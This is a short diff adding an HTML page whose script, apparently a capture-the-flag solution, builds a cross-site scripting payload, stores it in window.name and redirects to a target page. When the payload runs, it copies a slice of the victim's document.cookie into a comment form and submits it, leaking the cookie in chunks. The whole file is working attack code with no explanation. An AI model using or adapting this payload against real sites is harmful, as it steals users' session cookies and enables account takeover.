@@ -1,0 +1,13 @@
+<html lang="en">
+<body>
+  <script>
+    const offset = 0;
+    const payload = `<img src=1 onerror="
+        document.querySelector('[name=comment]').value = document.cookie.replace(/%/g,'/').substring(${offset},${offset}+25);
+        document.querySelector('button.btn').click()
+    " />`;
+    window.name = payload;
+    location.href = 'http://web/result';
+  </script>
+</body>
+</html>
